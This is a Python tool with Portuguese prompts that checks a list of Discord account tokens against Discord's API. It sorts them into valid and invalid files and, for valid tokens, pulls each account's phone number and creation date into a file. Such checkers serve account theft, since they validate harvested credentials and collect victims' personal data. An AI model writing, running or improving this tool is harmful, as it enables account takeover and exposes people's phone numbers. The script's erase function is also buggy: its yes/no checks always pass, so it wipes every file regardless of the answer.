import string
import requests, os, threading, sys, time, datetime, os.path
import colorama
from colorama import Fore, init, Back, Style


colorama.init()


def CheckUserToken():
    if not os.path.exists('./numeros/') and not os.path.exists('./tokens/'):
    	os.mkdir('numeros')
    	os.mkdir('tokens')
    with open('tokens.txt', 'r') as f: 
        for line in f:
                time.sleep(0)
                token = line.rstrip("\n")
                headers = {
                    'Authorization': f'{token}'  
                }
                src = requests.get('https://discord.com/api/v8/users/@me/library', headers=headers) 
                try:
                    if src.status_code == 200:
                        print(Fore.WHITE+"["+Style.BRIGHT + Fore.GREEN + Back.BLACK+"+"+Fore.WHITE+"] "+Fore.RESET + token)
                        if not os.path.exists("tokens/valid.txt"):
                            open('tokens/valid.txt', 'a+')
                        with open('tokens/valid.txt','a',encoding='utf8') as f:
                            f.write(token+'\n')                    
                    else:
                        print(Fore.WHITE+"["+Style.BRIGHT + Fore.RED + Back.BLACK+"-"+Fore.WHITE+"] "+Fore.RESET + token)
                        if not os.path.exists("tokens/invalid.txt"):
                            open('tokens/invalid.txt', 'a+')
                        with open('tokens/invalid.txt','a',encoding='utf8') as f:
                            f.write(token+'\n')
                except Exception:
                    print(f"{Fore.CYAN}Erro {Fore.RESET}")
def CheckNumber():
    with open('tokens/valid.txt', 'r') as f: 
        for line in f:
                time.sleep(0)
                token = line.rstrip("\n")
                headers = {
                    'Authorization': f'{token}'  
                }
                src = requests.get('https://discord.com/api/v8/users/@me', headers=headers) 
                src = src.json()
                get_phone = src['phone']
                get_id = src['id']
                date_create = datetime.datetime.utcfromtimestamp(((int(get_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%y %H:%M:%S')

                try:
                    if src['phone'] != None:
                        print(Fore.WHITE+"["+Style.BRIGHT + Fore.GREEN + Back.BLACK+"+"+Fore.WHITE+"] "+Fore.RESET + token + ' | ' + src['phone'] + ' | ' + date_create)
                        if not os.path.exists("numeros/verificado.txt"):
                            open('numeros/verificado.txt', 'a+')
                        with open('numeros/verificado.txt','a',encoding='utf8') as f:
                            f.write(f'{token} |  {get_phone} |  {date_create} \n')                    
                    else:
                        print(Fore.WHITE+"["+Style.BRIGHT + Fore.RED + Back.BLACK+"-"+Fore.WHITE+"] "+Fore.RESET + token + ' | None')
                        if not os.path.exists("numeros/noverified.txt"):
                            open('numeros/noverified.txt', 'a+')
                        with open('numeros/noverified.txt','a',encoding='utf8') as f:
                            f.write(token+ ' | None''\n')
                except Exception as e:
                    print(f"{Fore.CYAN} {e} {Fore.RESET}")



def EraseText():
    with open('tokens.txt', 'r+') as f: 
        f.truncate(0)
def EraseAll():
	erase_Valid = input("Quer apagar os tokens válidos? Y/N ")
	erase_Invalid = input("Quer apagar os tokens inválidos? Y/N ")
	erase_verificado = input("Quer apagar os números verificados? Y/N ")
	erase_noverified = input("Quer apagar os números não verificados? Y/N ")

	if erase_Valid == 'Y' or 'y':
		with open('tokens/valid.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass

	if erase_Invalid == 'Y' or 'y':
		with open('tokens/invalid.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass
	if erase_verificado == 'Y' or 'y':
		with open('numeros/verificado.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass
	if erase_noverified == 'Y' or 'y':
		with open('numeros/noverified.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass